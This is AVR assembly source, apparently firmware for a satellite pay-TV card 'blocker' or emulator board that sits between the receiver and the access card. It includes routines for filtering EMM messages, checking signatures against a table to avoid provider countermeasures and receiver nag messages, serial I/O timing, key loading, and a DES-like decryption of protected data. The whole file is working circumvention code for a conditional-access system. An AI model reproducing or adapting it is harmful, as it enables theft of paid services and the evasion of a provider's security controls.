		ldi	XH, high(eSIDs)	; X = 0x004C (eSIDs)
		rcall	WriteEEP
		ldi	XL, low(eSID2)
		ldi	XH, high(eSID2)	; X = 0x0074 (eSID2)
		rcall	WriteEEP
		ldi	XL, low(eSID3)
		ldi	XH, high(eSID3)	; X = 0x0091 (eSID3)
		rcall	WriteEEP


		cpi	r16, 1		; is this dish ?
		brne	UpSID_L1
		ori	r16, 1		; should have already been = 1
		rjmp	UpSID_L2

UpSID_L1:				; ...
		andi	r16, 0xFE	; clear	bit 0

UpSID_L2:				; ...
		mov	SID, r16	; set our Sys Flags


		ldi	XH, high(eEnabler)
		ldi	XL, low(eEnabler)
		rcall	ReadEEP		; X = 0x00CF (eEnabler)
		or	SID, r16	; combine sys ID & enabler type
		sts	sSysID,	SID	; save Sys flags to sSysID


		rcall	PrepPubKeys	; prepare keys for decrypting


		ldi	r16, 3
		sts	Stat1, r16	; status flag 1	= 3, Database updated, CAM has been reset
		clr	r16
		sts	Stat3, r16	; clear	status flags 3
		ldi	r16, 4
		sts	Stat2, r16	; status flags 2 = 0x04, EMM processing	done


		ldi	r16, 0xCF
		sts	sC21_flag1, r16	; sram 0x75 = 0xCF
		ser	r16		; = 0xFF
		sts	sC21_flag2, r16	; sram 0x76 = 0xFF


		ret


;-------------------------------------------------------------------------------------------------------------------

Send_Done0n1:

; MCG305 always set the status to indicate IRD command waiting				; ...
;		clr	r16
;		sts	Stat1, r16	; clear	status word 1
;		sts	Stat3, r16	; clear	status word 3
;		ldi	r16, 0x24
;		sts	Stat2, r16	; status word 2	= 0x24,	ie. IRD	command	waiting	& EMM processing done


; MCG306 checks the signature of the packet to determine 
; if there truely is an IRD command in this EMM msg
; Need to check because incorrect response will generate a 104 Nag message on ird
; and Charlie can cause an ECM of the IRD
;
; MCG306 WAS *****************************************************************
;		clr	r17
;		sts	Stat1, r17	; clear	status word 1
;		sts	Stat3, r17	; clear	status word 3
;		ldi	r17, 4		; default stat 2 = EMM processing done
;		
;Cmd0n1_ckSig1:
;		ldi	r18, 8			; 8 bytes in signature
;		ldi	XH, high(eCmd0_Sig1)	; X -> signature bytes in EEprom
;		ldi	XL, low(eCmd0_Sig1)
;		ldi	YH, high(sMB_10)	; Y -> signature bytes in msg
;		ldi	YL, low(sMB_10)
;
;Cmd0n1_ckSig1_Lp:
;		ld	r15, Y+			; get signature byte from msg
;		rcall	ReadEEP			; get signature byte from EEprom
;		cp	r15, r16		; compare bytes
;		brne	Cmd0n1_ckSig2		; signatures not equal - check next
;		dec	r18
;		brne	Cmd0n1_ckSig1_Lp	; check all bytes
;		rjmp	Cmd0n1_isIRDcmnd	; signatures are the same - set IRD cmnd waiting

; *****************************************************************************************
; MCG307 START CHANGES #5 *****************************************************************
; *****************************************************************************************
loc_57:	ldi	XH, high(BigTable * 2)
		ldi	XL, low(BigTable * 2)
		
loc_58:	ldi	r18,8
		mov	ZH,XH
		mov	ZL,XL
		ldi	YH, high(sMB_10)	; Y -> signature bytes in msg
		ldi	YL, low(sMB_10)
loc_59:	ld	r15,y+
		lpm
		adiw	ZL,1
		cp	r15,r0
		brne	loc_60
		dec	r18
		brne	loc_59
		
		lpm
		mov	XL,r0
		adiw	ZL,1
		lpm
		mov	XH,r0
		adiw	ZL,1
		lsl	XL
		rol	XH
		rcall	sub_137
		rjmp	Cmd0n1_isIRDcmnd		; loc_61
		
loc_60:	adiw	XL,0x05*2

		cpi	XH,high((BigTable+0x14)*2)
		brcs	loc_58
		cpi	XL,low((BigTable+0x14)*2)
		brcs	loc_58

		ldi	r17,4
		rjmp	Cmd0n1_SetStatus		; loc_62
; *****************************************************************************************
; MCG307 CHANGES END #5
; *****************************************************************************************
; MCG306 WAS
						; signatures are the same - set IRD cmnd waiting
;Cmd0n1_ckSig2:
;		ldi	r18, 8			; 8 bytes in signature
;		ldi	XH, high(eCmd0_Sig2)	; X -> signature bytes in EEprom
;		ldi	XL, low(eCmd0_Sig2)
;		ldi	YH, high(sMB_10)	; Y -> signature bytes in msg
;		ldi	YL, low(sMB_10)
;
;Cmd0n1_ckSig2_Lp:
;		ld	r15, Y+			; get signature byte from msg
;		rcall	ReadEEP			; get signature byte from EEprom
;		cp	r15, r16
;		brne	Cmd0n1_ckSig3		; signatures not equal - check next
;		dec	r18
;		brne	Cmd0n1_ckSig2_Lp	; check all bytes

;		rjmp	Cmd0n1_isIRDcmnd	; signatures are the same - set IRD cmnd waiting
;
;Cmd0n1_ckSig3:
;		ldi	r18, 8			; 8 bytes in signature
;		ldi	XH, high(eCmd0_Sig3)	; X -> signature bytes in EEprom
;		ldi	XL, low(eCmd0_Sig3)
;		ldi	YH, high(sMB_10)	; Y -> signature bytes in msg
;		ldi	YL, low(sMB_10)
;
;Cmd0n1_ckSig3_Lp:
;		ld	r15, Y+			; get signature byte from msg
;		rcall	ReadEEP			; get signature byte from EEprom
;		cp	r15, r16
;		brne	Cmd0n1_SetStatus	; signatures not equal - use default status 2
;		dec	r18
;		brne	Cmd0n1_ckSig3_Lp	; check all bytes
;
; END WAS 306
; *****************************************************************************************

Cmd0n1_isIRDcmnd:
		ldi	r17, 0x24	; status word 2	= IRD command waiting & EMM processing done

Cmd0n1_SetStatus:
		sts	Stat2, r17

; *****************************************************************************************
; MCG307 START CHANGES #6 *****************************************************************
; *****************************************************************************************
		clr	r17
		sts	Stat1,r17
		sts	Stat3,r17
; *****************************************************************************************
;MCG307 CHANGES END #6
; *****************************************************************************************

	; end of MCG306 changes


Send_FlipSeqBit:			; ...
		lds	r16, sMB_5	; (sMbCN) flip seq bit
		ldi	r17, 0x80
		eor	r16, r17	; flip the bit
		sts	sMsgBuf, r16

Send_SeqACK:				; ...
		ldi	YL, low(sMB_1)
		ldi	YH, high(sMB_1)	; Y = 0x00A9 (sMsgBuf+1)
		ldi	r16, 3
		st	Y+, r16		; data length =	3
		subi	r16, 0xFC	; LEN =	data length + 4
		mov	LEN, r16	; LEN =	len + 2
		ldi	r16, 0xB1
		st	Y+, r16		; msgbuf = 0xB1
		ldi	r16, 1
		st	Y+, r16		; msgbug = 0x01
		lds	r16, sSeqNum	; inc sequence number
		inc	r16
		sts	sSeqNum, r16
		st	Y+, r16		; msgbuf = seq num
		rjmp	Send9000


		
;-------------------------------------------------------------------------------------------------------------------

Send_6900:				; ...
		clr	r16		; SW2 =	0x00
		rjmp	Send_SW1x69

		ldi	r16, 0x85	; this appears to be orphan code

Send_SW1x69:				; ...
		ldi	r18, 0x69	; SW1 =	0x69
		rjmp	Send_Status

Send_SW1x6E:				; ...
		ldi	r18, 0x6E	; SW1 =	0x6E
		rjmp	Send_SW2x00

BadCmd:					; ...
		ldi	r18, 0x6F	; SW1 = 0x6F

Send_SW2x00:				; ...
		clr	r16		; SW2 =	0x00

Send_Status:				; ...
		sts	sMsgBuf, r18	; set SW1
		sts	sMB_1, r16	; set SW2
		ldi	r16, 2
		mov	LEN, r16	; LEN =	2
		rjmp	Respond		; Send Status words


		
;-------------------------------------------------------------------------------------------------------------------
; ллллллллллллллл S U B	R O U T	I N E ллллллллллллллллллллллллллллллллллллллл
;
; Transmit a byte of the ATR
; On entry R16 is byte to send


TX_ATR:					; ...
		sbrs	SID, 7		; Are we a blocker or AVR?
		rjmp	TX_ATR_blocker
		rjmp	TX_ATR_AVR
		
		
;-------------------------------------------------------------------------------------------------------------------

TX_ATR_blocker:
		push	r18
		sbi	DDRD, 4		; Blocker uses PinD4 as I/O Line - so set to output

		ldi	r25, 240	; delay	742 clocks
		rcall	Delay

		cbi	PORTD, 4	; TX line low
		rjmp	TbL1

TbL1:
		rjmp	TbL2

TbL2:					; save the data	byte - although	it's not used.
		mov	r15, r16
		ldi	r18, 8		; 8 bits
		clr	r24		; clear	parity

Tb8bits:				; ...
		ldi	r25, 117	; delay	354 clocks
		rcall	Delay
		rjmp	TbL3

TbL3:					; put high bit into carry
		rol	r16
		brcs	Tb_TXhi		; jump if bit =	1
		nop
		sbi	PORTD, 4	; set TX line high (inverted data)
		rjmp	TbL4

TbL4:					; ...
		adc	r24, r25	; Calculate parity
		andi	r24, 1
		dec	r18
		brne	Tb8bits


		ldi	r25, 118	; delay	351 clocks
		rcall	Delay
		ror	r24
		brcs	Tb_TXhi9
		nop
		sbi	PORTD, 4
		rjmp	TbDone

TbDone:					; ...
		ldi	r25, 120	; Delay363 clocks
		rcall	Delay


		nop
		sbi	PORTD, 4	; Set TX line high (inactive)
		cbi	DDRD, 4		; set I/O Line to Receive
		pop	r18		; restore count
		dec	r18		; send 1 byte of ATR
		ret

Tb_TXhi9:   ; TX line low and done sending
		cbi	PORTD, 4
		rjmp	TbDone

Tb_TXhi:   ; TX line low and send more data
		cbi	PORTD, 4
		rjmp	TbL4
		
		
		
;-------------------------------------------------------------------------------------------------------------------

TX_ATR_AVR:
		push	r18		; save count
		sbi	DDRD, 0		; AVR uses PinD0 as I/O Line - so set to output


		ldi	r25, 240	; delay	723
		rcall	Delay


		cbi	PORTD, 0	; TX line low -	start bit
		rjmp	TaL1

TaL1:
		rjmp	TaL2

TaL2:				; save the data	byte - although	it's not used.
		mov	r15, r16


		ldi	r18, 8		; 8 bits
		clr	r24		; clear	parity

Ta8bits:				; ...
		ldi	r25, 117
		rcall	Delay
		rjmp	TaL3

TaL3:					; put data bit into carry - send MSB first
		rol	r16
		brcs	Ta_TXhi		; jump if bit =	1
		nop
		sbi	PORTD, 0
		rjmp	TaL4

TaL4:				; ...
		adc	r24, r25
		andi	r24, 1		; calculate parity
		dec	r18
		brne	Ta8bits


		ldi	r25, 118	; 357 clocks
		rcall	Delay


		ror	r24		; check	parity
		brcs	Ta_TXhi9
		nop
		sbi	PORTD, 0
		rjmp	TaDone

TaDone:				; ...
		ldi	r25, 120	; 363 clocks
		rcall	Delay


		nop
		sbi	PORTD, 0	; TX line low
		cbi	DDRD, 0		; set I/O line to input	(RX)
		pop	r18		; restore count
		dec	r18		; dec count, sent 1 byte of ATR
		ret

Ta_TXhi9: ; TX line low and done sending
		cbi	PORTD, 0	; set TX low, parity bit = 1 (inverted)
		rjmp	TaDone

Ta_TXhi:  ; TX line low and send more data
		cbi	PORTD, 0	; set TX line low, data	bit = 1	(inverted)
		rjmp	TaL4
; End of function TX_ATR



		
;-------------------------------------------------------------------------------------------------------------------
; ллллллллллллллл S U B	R O U T	I N E ллллллллллллллллллллллллллллллллллллллл
;
; On entry R16 = byte to TX

TX_IRD:					; ...
		sbrs	SID, 7		; Are we a blocker board (different I/O	lines)
		rjmp	TxP4_start	; to IRD from blocker board
		rjmp	TxP0_start	; to IRD from AVR


		
;-------------------------------------------------------------------------------------------------------------------
; ллллллллллллллл S U B	R O U T	I N E ллллллллллллллллллллллллллллллллллллллл


TX_CAM:					; ...
		sbrs	SID, 7		; AVR vs blocker board
		rjmp	TxP0_start	; to CAM from blocker
		rjmp	TxP4_start	; to CAM from AVR
; End of function TX_CAM




		
;-------------------------------------------------------------------------------------------------------------------
; ллллллллллллллл S U B	R O U T	I N E ллллллллллллллллллллллллллллллллллллллл
;
; On exit R16 =	data byte read from IRD
; Routine will wait forever for	byte to	be received!


RX_IRD:					; ...
		sbrs	SID, 7		; Are we a blocker board (different I/O	lines)
		rjmp	RxP4_start	; to blocker board from	IRD
		rjmp	RxP0_start	; to AVR from IRD
; End of function RX_IRD

		
;-------------------------------------------------------------------------------------------------------------------

RX_CAM:					; ...
		sbrs	SID, 7		; Are we a blocker board (different I/O	lines)
		rjmp	RxP0_start	; to Blocker board from	CAM
		rjmp	RxP4_start	; to AVR from CAM
		
;-------------------------------------------------------------------------------------------------------------------

;
; TX byte on PD4, to Card from AVR, to IRD from	blocker	board

TxP4_start:				; ...
		sbis	PIND, 4		; wait for I/O to go high - line idle
		rjmp	TxP4_start


		sbi	DDRD, 4		; set I/O line as output (TX)
		ldi	r25, 8
		rcall	Delay		; 27 clocks
		rjmp	TxP4_L1

TxP4_L1:				; set TX low (start bit)
		cbi	PORTD, 4
		rjmp	Tx_P4_L2

Tx_P4_L2:
		rjmp	TxP4_L3

TxP4_L3:
		nop
		ldi	r18, 8		; count	8 bits
		clr	r24		; clear	parity reg

TxP4_L4:				; ...
		ldi	r25, 4		; 15 clocks
		rcall	Delay
		nop
		rol	r16		; put MSB into carry
		brcs	TxP4_L10	; jump if bit =	1
		nop
		sbi	PORTD, 4	; bit =	0 so set TX low	(inverted data)
		rjmp	TxP4_L5

TxP4_L5:				; ...
		adc	r24, r25	; calc parity
		andi	r24, 1
		dec	r18		; dec count of bits
		brne	TxP4_L4		; TX 8 bits


		ldi	r25, 4		; 15 clocks
		rcall	Delay
		rjmp	TxP4_L6

TxP4_L6:				; put parity bit into carry
		ror	r24
		brcs	TxP4_L9		; jump if parity bit = 1
		nop
		sbi	PORTD, 4	; bit =	0 so set TX high (inverted data)
		rjmp	TxP4_L7

TxP4_L7:				; ...
		ldi	r25, 6		; 21 clocks
		rcall	Delay
		nop
		rjmp	TxP4_L8

TxP4_L8:				; set I/O line high
		sbi	PORTD, 4


		cbi	DDRD, 4		; set I/O line to input	(RX)
		ret
TxP4_L9:				; ...
		cbi	PORTD, 4	; bit =	1 so set TX low	(inverted)
		rjmp	TxP4_L7		; done sending
TxP4_L10:				; ...
		cbi	PORTD, 4	; bit =	1 so set TX low	(inverted)
		rjmp	TxP4_L5		; send more bits


		
;-------------------------------------------------------------------------------------------------------------------
;
; RX from PD4, Card for	AVR, IRD for blocker board

RxP4_start:				; ...
		sbis	PIND, 4		; wait for I/O to go high - line idle
		rjmp	RxP4_start

RxP4_L1:				; ...
		sbic	PIND, 4		; wait for RX to go low	= start	bit
		rjmp	RxP4_L1


		ldi	r25, 7

RxP4_L2:				; ...
		dec	r25
		brne	RxP4_L2		; delay


		ldi	r16, 1		; mark 1st bit

RxP4_L3:				; ...
		ldi	r25, 7

RxP4_L4:				; ...
		dec	r25
		brne	RxP4_L4		; delay


		nop
		nop
		in	r24, PIND	; Read Data port
		lsr	r24		; shift	received bit into carry
		lsr	r24
		lsr	r24
		lsr	r24
		lsr	r24
		rol	r16		; shift	bit into R16 -	this also puts it MSB first


		brcc	RxP4_L3		; when all bits	shifted	in "mark bit" goes into carry


		com	r16		; invert data


		ldi	r25, 7

RxP4_L5:				; ...
		dec	r25
		brne	RxP4_L5		; delay

RxP4_L6:				; ...
		sbis	PIND, 4		; wait for line	to go high
		rjmp	RxP4_L6


		ret

		
;-------------------------------------------------------------------------------------------------------------------
;
; TX line is PD0, IRD for AVR, Card for	blocker	board

TxP0_start:				; ...
		sbis	PIND, 0		; wait for I/O to go high - line idle
		rjmp	TxP0_start


		sbi	DDRD, 0		; set I/O line as output (TX)
		ldi	r25, 8
		rcall	Delay		; 27 clocks
		rjmp	TxP0_L1

TxP0_L1:				; set TX low (start bit)
		cbi	PORTD, 0
		rjmp	TxP0_L2

TxP0_L2:
		rjmp	TxP0_L3

TxP0_L3:
		nop
		ldi	r18, 8		; count	8 bits
		clr	r24		; clear	parity reg

TxP0_L4:				; ...
		ldi	r25, 4		; 15 clocks
		rcall	Delay
		nop
		rol	r16		; put MSB into carry
		brcs	TxP0_L10	; jump if bit =	1
		nop
		sbi	PORTD, 0	; bit =	0 so set TX low	(inverted data)
		rjmp	TxP0_L5

TxP0_L5:				; ...
		adc	r24, r25	; calc parity
		andi	r24, 1
		dec	r18		; dec count of bits
		brne	TxP0_L4		; TX 8 bits


		ldi	r25, 4		; 15 clocks
		rcall	Delay
		rjmp	TxP0_L6

TxP0_L6:				; put parity bit into carry
		ror	r24
		brcs	TxP0_L9
		nop
		sbi	PORTD, 0	; bit =	0 so set TX high (inverted data)
		rjmp	TxP0_L7

TxP0_L7:				; ...
		ldi	r25, 6		; 21 clocks
		rcall	Delay
		nop
		rjmp	TxP0_L8

TxP0_L8:				; set I/O line high
		sbi	PORTD, 0


		cbi	DDRD, 0		; set I/O line to input	(RX)
		ret

TxP0_L9:				; ...
		cbi	PORTD, 0	; bit =	1 so set TX low	(inverted)
		rjmp	TxP0_L7		; done sending

TxP0_L10:				; ...
		cbi	PORTD, 0	; bit =	1 so set TX low	(inverted)
		rjmp	TxP0_L5		; send more bits


		
;-------------------------------------------------------------------------------------------------------------------
;
; RX line is PD0, IRD for AVR, Card for	blocker	board

RxP0_start:				; ...
		sbis	PIND, 0		; wait for RX to go high = line	idle
		rjmp	RxP0_start

RxP0_L1:				; ...
		sbic	PIND, 0		; wait for RX to go low	= start	bit
		rjmp	RxP0_L1


		ldi	r25, 6

RxP0_L2:				; ...
		dec	r25
		brne	RxP0_L2		; delay


		ldi	r16, 1		; set "mark bit" flag

RxP0_L3:				; ...
		ldi	r25, 9

RxP0_L4:				; ...
		dec	r25
		brne	RxP0_L4		; delay


		in	r24, PIND	; read Port D data latch
		lsr	r24		; shift	bit into carry
		rol	r16		; shift	bit into LSB of	R16 - this will	bit reversed the received data
		brcc	RxP0_L3		; loop until "mark bit" is shifted into carry

		com	r16		; invert data

		nop
		ldi	r25, 9
		
RxP0_L5:				; ...
		dec	r25
		brne	RxP0_L5		; delay

RxP0_L6:				; ...
		sbis	PIND, 0		; wait for line	to go high = inactive
		rjmp	RxP0_L6

		ret

		
;-------------------------------------------------------------------------------------------------------------------
;
; Delay	-  timing = 3 +	3 x R25	 cycles
;
Delay:					; ...
		dec	r25
		brne	Delay
		ret
; End of function Delay

		
;-------------------------------------------------------------------------------------------------------------------
; ллллллллллллллл S U B	R O U T	I N E ллллллллллллллллллллллллллллллллллллллл
;
; Enter	with address from which	to read	in XH:XL.  Returns with	data
; in R16, and XH:XL incremented	by 1
;

ReadEEP:				; ...
		sbic	EECR, 1
		rjmp	ReadEEP
		out	EEARL, XL
		out	EEARH, XH
		sbi	EECR, 0
		in	r16, EEDR
		adiw	XL, 1
		ret
; End of function ReadEEP


		
;-------------------------------------------------------------------------------------------------------------------
; ллллллллллллллл S U B	R O U T	I N E ллллллллллллллллллллллллллллллллллллллл
;
; Enter	with address to	which to write in XH:XL	and data to be written
; in R16.  Returns with	XH:XL incremented by 1
;
WriteEEP:				; ...
		sbic	EECR, 1
		rjmp	WriteEEP
		out	EEARL, XL
		out	EEARH, XH
		out	EEDR, r16
		sbi	EECR, 2
		sbi	EECR, 1
		adiw	XL, 1
		ret
; End of function WriteEEP


		
;-------------------------------------------------------------------------------------------------------------------
; ллллллллллллллл S U B	R O U T	I N E ллллллллллллллллллллллллллллллллллллллл
;
; BITFLOP: Bit-flop R16, result	in R15
;
; Enter	with a byte in R16, bits arranged as follows: 76543210
; Exits	with a byte in R15, bits arranged as follows: 01234567
;
BitFlop:				; ...
		ror	r16
		rol	r15
		ror	r16
		rol	r15
		ror	r16
		rol	r15
		ror	r16
		rol	r15
		ror	r16
		rol	r15
		ror	r16
		rol	r15
		ror	r16
		rol	r15
		ror	r16
		rol	r15
		ret
; End of function BitFlop


		
;-------------------------------------------------------------------------------------------------------------------
; ллллллллллллллл S U B	R O U T	I N E ллллллллллллллллллллллллллллллллллллллл
;
;  InitYbuf; Y = addr to head of data buffer
;
InitYbuf:				; ...
		ldi	YL, low(sMsgBuf) ; Y	= 0x00A8 (sMsgBuf)
		ldi	YH, high(sMsgBuf)
		ret
; End of function InitYbuf




		
;-------------------------------------------------------------------------------------------------------------------
; ллллллллллллллл S U B	R O U T	I N E ллллллллллллллллллллллллллллллллллллллл
;
;
; X = address of key in	EEPROM

LoadKey:				; ...
		ldi	YH, high(sKeyBuff0)
		ldi	YL, low(sKeyBuff0) ;	Y = 0x0100 (sKeyBuf)

LdKy_Read:				; ...
		rcall	ReadEEP
		st	Y+, r16
		cpi	YL, 8		; load 8 bytes
		brne	LdKy_Read
;
; Bit-flop 8 byte key
;
		ldi	XL, low(sKeyBuff0)
		ldi	XH, high(sKeyBuff0) ; X	= 0x0100  (sKeyBuf)

LdKyRevBits:				; ...
		ld	r16, X
		rcall	BitFlop
		st	X+, r15
		cpi	XL, 8		; Loop 8 bytes
		brne	LdKyRevBits
;
; Discard high bit of 8	byte key stored	at KEYBUFF, pack into 7	bytes
; stored at KEYBUFF .. KEYBUFF+6.
;
		clr	r17

LdKyRLbf:				; ...
		mov	r16, r17	; Shift	bits in	key buffer
		ldi	XH, high(sKeyBuff7)
		ldi	XL, low(sKeyBuff7) ;	X = 0x0107 (sKeyBuf+7)

LdKyRLb:				; ...
		ld	r15, X		; Shift	bits in	this byte
		rol	r15
		st	X, r15
		dec	XL
		brmi	LdKy_Done	; jump if XL < 0, ie looped thru buff
		dec	r16
		brpl	LdKyRLb
		inc	r17		; Each byte gets shifted more
		rjmp	LdKyRLbf

LdKy_Done:				; ...
		ret
; End of function LoadKey


		
;-------------------------------------------------------------------------------------------------------------------
; ллллллллллллллл S U B	R O U T	I N E ллллллллллллллллллллллллллллллллллллллл
;
; On entry X =	addr to	save R17 - R25
; R17 -	R25 has	data to	be saved

SaveKeyRegs:				; ...
		ldi	YH, 0
		ldi	YL, 17		; Y = 0x0011, ie R17

SvRgsLp:				; ...
		ld	r16, Y+		; Load reg value
		st	X+, r16		; Save regs value
		cpi	YL, 26		; Save thru R25
		brne	SvRgsLp
		ret
; End of function SaveKeyRegs



; ллллллллллллллл S U B	R O U T	I N E ллллллллллллллллллллллллллллллллллллллл
;
; On entry (sKeyPt) contains the addres	of the permutated key to load

LoadKeyRegs:				; ...
		lds	XH, sKeyPtH
		lds	XL, sKeyPtL	; X = ptr from Addr (sKeyPt)
		ldi	YH, 0
		ldi	YL, 17		; Y = 0x0011, ie R17

LdKyRgsLp:				; ...
		ld	r16, X+		; Load value
		st	Y+, r16		; Save in register
		cpi	YL, 26		; Load thru R25
		brne	LdKyRgsLp
		ret
; End of function LoadKeyRegs



		
;-------------------------------------------------------------------------------------------------------------------
; ллллллллллллллл S U B	R O U T	I N E ллллллллллллллллллллллллллллллллллллллл
;
;*****
;
; DECRYPT: Decrypt an 8-byte block of data pointed to by an address stored
;	   at PACPTRH:PACPTRL.	On entry, the compressed key to	use for
;	   decryption is stored	at KEYBUFF..KEYBUFF+6.	This routine will
;	   perform an initial permutation on the key, but will not update
;	   the key in KEYBUFF.	Rather,	the result of the key's permutation
;	   will	be stored in the working key registers.
;
;*****

;
; Here,	we're initializing the working key registers.  Registers KEY1..KEY8
; represent the	48 bits	of the key that	will be	used on	a given	round of
; decryption, and UKBITS is a holding register for the remainder of the
; key bits.
;
; Note that registers KEY1..KEY8 are pre-initialized with static data that is
; used to allow	preselection of	the appropriate	s-box for the bits of data
; that are contained within.
;
; Note that there are no comments on the key permutation itself: This code is
; relatively straightforward, and comments like	"Move bit x of raw byte y to
; bit a	of permuted byte b" won't help anyone.  Instead, refer to the following
; table	to see the relationship	of the permuted	bits to	the raw	bits:
;
; Raw key: 00 C7 CF EC 71 A8 3E	65
; 
; In binary: 0000 0000	1100 0111  1100	1111  1110 1100
; 
;	Bit: 6666 5555	5555 5544  4444	4444  3333 3333
;	     3210 9876	5432 1098  7654	3210  9876 5432
; 
; 
;	     0111 0001	1010 1000  0011	1110  0110 0101
; 
;	Bit: 3322 2222	2222 1111  1111	11
;	     1098 7654	3210 9876  5432	1098  7654 3210
;
;		      ----- bit	within permuted	key byte ----
;		 reg   7    6	 5    4	   3	2    1	  0
;		 ---- ---- ----	---- ---- ---- ---- ---- ----
;		KEY1  -0-  -0-	31   63	   5   46   61	 22
;		KEY2  54   29	23   14	  36   47   -0-	 -0-
;		KEY3  -0-  -1-	 7   52	  39   38   45	 13
;		KEY4  55   30	37   44	  15	6   -0-	 -1-
;		KEY5  -1-  -0-	12   43	  58   41    3	 26
;		KEY6  35   25	59   11	  34   49   -1-	 -0-
;		KEY7  -1-  -1-	28   17	   4   42   27	  2
;		KEY8  33   57	 1   19	  18   51   -1-	 -1-
;	      UKBITS  20   10	50    9	  60   21   53	 62
;

DeCrypt_Init:				; ...
		ldi	r17, 0
		ldi	r18, 0
		ldi	r19, 0x40
		ldi	r20, 1
		ldi	r21, 0x80
		ldi	r22, 2
		ldi	r23, 0xC0
		ldi	r24, 3
		ldi	r25, 0


		lds	r16, sKeyBuff0	; 1st byte of (sKeyBuf)
		sbrc	r16, 0
		ori	r22, 4
		sbrc	r16, 1
		ori	r17, 0x10
		sbrc	r16, 2
		ori	r25, 1
		sbrc	r16, 3
		ori	r17, 2
		sbrc	r16, 4
		ori	r25, 8
		sbrc	r16, 5
		ori	r22, 0x20
		sbrc	r16, 6
		ori	r21, 8
		sbrc	r16, 7
		ori	r24, 0x40
		lds	r16, sKeyBuff1	; 2nd byte of (sKeyBuf)
		sbrc	r16, 0
		ori	r23, 4
		sbrc	r16, 1
		ori	r21, 4
		sbrc	r16, 2
		ori	r20, 0x80
		sbrc	r16, 3
		ori	r18, 0x80
		sbrc	r16, 4
		ori	r25, 2
		sbrc	r16, 5
		ori	r19, 0x10
		sbrc	r16, 6
		ori	r24, 4
		sbrc	r16, 7
		ori	r25, 0x20
		lds	r16, sKeyBuff2	; (sKeyBuf) + 2
		sbrc	r16, 0
		ori	r22, 0x80
		sbrc	r16, 1
		ori	r22, 8
		sbrc	r16, 2
		ori	r24, 0x80
		sbrc	r16, 3
		ori	r18, 4
		sbrc	r16, 4
		ori	r17, 4
		sbrc	r16, 5
		ori	r19, 2
		sbrc	r16, 6
		ori	r20, 0x10
		sbrc	r16, 7
		ori	r21, 0x10
		lds	r16, sKeyBuff3	; (sKeyBuf) + 3
		sbrc	r16, 0
		ori	r23, 0x20
		sbrc	r16, 1
		ori	r23, 2
		sbrc	r16, 2
		ori	r21, 1
		sbrc	r16, 3
		ori	r22, 0x40
		sbrc	r16, 4
		ori	r19, 8
		sbrc	r16, 5
		ori	r19, 4
		sbrc	r16, 6
		ori	r20, 0x20
		sbrc	r16, 7
		ori	r18, 8
		lds	r16, sKeyBuff4	; (sKeyBuf) + 4
		sbrc	r16, 0
		ori	r25, 4
		sbrc	r16, 1
		ori	r25, 0x80
		sbrc	r16, 2
		ori	r24, 0x10
		sbrc	r16, 3
		ori	r24, 8
		sbrc	r16, 4
		ori	r23, 0x10
		sbrc	r16, 5
		ori	r17, 0x20
		sbrc	r16, 6
		ori	r20, 0x40
		sbrc	r16, 7
		ori	r18, 0x40
		lds	r16, sKeyBuff5	; (sKeyBuf) + 5
		sbrc	r16, 0
		ori	r18, 0x10
		sbrc	r16, 1
		ori	r19, 1
		sbrc	r16, 2
		ori	r21, 0x20
		sbrc	r16, 3
		ori	r22, 0x10
		sbrc	r16, 4
		ori	r25, 0x40
		sbrc	r16, 5
		ori	r25, 0x10
		sbrc	r16, 6
		ori	r18, 0x20
		sbrc	r16, 7
		ori	r17, 1
		lds	r16, sKeyBuff6	; (sKeyBuf) + 6
		sbrc	r16, 0
		ori	r19, 0x20
		sbrc	r16, 1
		ori	r20, 4
		sbrc	r16, 2
		ori	r17, 8
		sbrc	r16, 3
		ori	r23, 8
		sbrc	r16, 4
		ori	r21, 2
		sbrc	r16, 5
		ori	r23, 1
		sbrc	r16, 6
		ori	r24, 0x20
		sbrc	r16, 7
		ori	r20, 8


		ret
; End of function DeCrypt_Init


		
;-------------------------------------------------------------------------------------------------------------------
; ллллллллллллллл S U B	R O U T	I N E ллллллллллллллллллллллллллллллллллллллл

DeCrypt_Proc:				; ...
		rcall	LoadKeyRegs
		rcall	InitCrypto

DCP_L1:					; ...
		ror	r4		; Get #	of key rotations to perform this round into the	carry flag
		ror	r5
		brcs	DCP_L2		; If we	only need to perform 1 key rotation,
					;  then	skip extra key rotation	step
		rcall	DPermute	; Else go permute key from last	round
		rcall	KeyUpDate

DCP_L2:					; ...
		rcall	DPermute
		rcall	SswapUp		; Perform S-box	substitution, ciphertext word swap, p-box, and update key
					; 
		tst	r15		; All finished?
		brpl	DCP_L1


		ret
; End of function DeCrypt_Proc



		
;-------------------------------------------------------------------------------------------------------------------
; ллллллллллллллл S U B	R O U T	I N E ллллллллллллллллллллллллллллллллллллллл
;*****
;
; DPERMUTE: Permute key	for decryption
;
; This routine takes the 8 bytes of data pointed to by Y and permutes it.
; I suspect that this is actually a combination	of the key rotation and
; PC-2 permuted	choice tables.	Much like the key's initial permutation,
; this routine selects 48 of the 56 key	bits and uses them to perform the
; XOR-operation	on the data being encrypted before the s-box substitution.
; As with the initial permutation, the comments	for this section are sparse,
; because the code is very straightforward.  One thing to take note of is
; that the only	bits that are checked in this permutation are the bits
; that are not used as static s-box selection bits.
;
;*****

DPermute:				; ...
		ldi	r17, 0		; Initialize static s-box selection bits
		ldi	r18, 0
		ldi	r19, 0x40
		ldi	r20, 1
		ldi	r21, 0x80
		ldi	r22, 2
		ldi	r23, 0xC0
		ldi	r24, 3
		ldi	r25, 0


		ld	r16, Y
		sbrc	r16, 0
		ori	r18, 0x10
		sbrc	r16, 1
		ori	r25, 2
		sbrc	r16, 2
		ori	r19, 4
		sbrc	r16, 3
		ori	r25, 8
		sbrc	r16, 4
		ori	r20, 0x80
		sbrc	r16, 5
		ori	r18, 0x20


		ldd	r16, Y+1
		sbrc	r16, 2
		ori	r19, 8
		sbrc	r16, 3
		ori	r17, 0x10
		sbrc	r16, 4
		ori	r20, 4
		sbrc	r16, 5
		ori	r20, 8
		sbrc	r16, 6
		ori	r25, 4
		sbrc	r16, 7
		ori	r17, 4


		ldd	r16, Y+2
		sbrc	r16, 0
		ori	r17, 8
		sbrc	r16, 1
		ori	r20, 0x20
		sbrc	r16, 2
		ori	r20, 0x40
		sbrc	r16, 3
		ori	r17, 0x20
		sbrc	r16, 4
		ori	r20, 0x10
		sbrc	r16, 5
		ori	r25, 1


		ldd	r16, Y+3
		sbrc	r16, 2
		ori	r17, 2
		sbrc	r16, 3
		ori	r19, 0x20
		sbrc	r16, 4
		ori	r18, 8
		sbrc	r16, 5
		ori	r18, 0x40
		sbrc	r16, 6
		ori	r17, 1
